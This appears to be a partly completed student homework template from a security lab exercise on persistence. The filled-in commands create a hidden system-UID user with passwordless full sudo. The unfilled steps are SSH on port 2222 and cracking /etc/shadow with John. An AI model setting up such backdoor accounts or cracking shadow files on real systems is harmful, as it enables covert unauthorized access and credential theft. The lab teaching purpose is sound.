Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `adduser --no-create-home sysd`

2. Give your secret user a password: 
    - `The password promt initiated after adding user. But, if i wanted to change it, the cmd is sudo passwd sysd`

3. Give your secret user a system UID < 1000:
    - `usermod -u 123 sysd`

4. Give your secret user the same GID:
   - `groupmod -g 123 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `sudo visudo and add sysd in '# Allow members of group sudo to execute any command' with 'sysd ALL=(ALL) NOPASSWD: ALL'`

6. Test that `sudo` access works without your password:

    ```sudo ls```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    Your bash commands here
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `sudo /etc/init.d/ssh restart`

2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `Your solution command here`

4. Use `sudo` to switch to the root user:
    - `Your solution command here`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `Your solution command here`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `Your solution command here`
